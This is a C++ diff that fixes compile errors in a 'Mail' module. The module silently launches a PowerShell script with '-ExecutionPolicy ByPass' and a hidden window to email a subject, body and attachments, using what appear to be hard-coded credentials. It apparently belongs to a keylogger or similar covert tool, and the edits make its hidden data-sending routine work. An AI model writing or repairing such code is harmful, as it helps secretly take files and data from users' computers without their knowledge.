@@ -57,7 +57,7 @@ namespace Mail {
 #undef X_EM_TO
 #undef X_EM_PASS
 
-    std::string StringReplace(srd::string s, const std::string &what, const std::string &with){
+    std::string StringReplace(std::string s, const std::string &what, const std::string &with){
         if(what.empty()){
             return s;
         }
@@ -104,7 +104,7 @@ namespace Mail {
         if(!ok){
             return -2;
         }
-        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \"" + StringReplace(subject, "\"", "\\\"") + "\" -Body \"" + StringReplace(body, "\\\"") + "\" -Att \"" + attachments + "\"";
+        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \"" + StringReplace(subject, "\"", "\\\"") + "\" -Body \"" + StringReplace(body, "\"","\\\"") + "\" -Att \"" + attachments + "\"";
         SHELLEXECUTEINFO ShExecInfo = {0};
         ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
         ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -114,13 +114,13 @@ namespace Mail {
         ShExecInfo.lpParameters = param.c_str();
         ShExecInfo.lpDirectory = NULL;
         ShExecInfo.nShow = SW_HIDE;
-        ShExecInfo.hInstApp = Null;
+        ShExecInfo.hInstApp = NULL;
 
         ok = (bool)ShellExecuteEx(&ShExecInfo);
         if(!ok){
             return -3;
         }
-        WaitForSingleObject(Sh.ExecInfo.hProcess, 7000);
+        WaitForSingleObject(ShExecInfo.hProcess, 7000);
         DWORD exit_code = 100;
         GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
 
@@ -148,8 +148,8 @@ namespace Mail {
             for(const auto &v : att){
                 attachments += v + "::";
             }
+            attachments = attachments.substr(0, attachments.length() - 2);
         }
-        attachments = attachments.substr(0, attachments.length() - 2);
         return SendMail(subject, body, attachments);
     }
 }
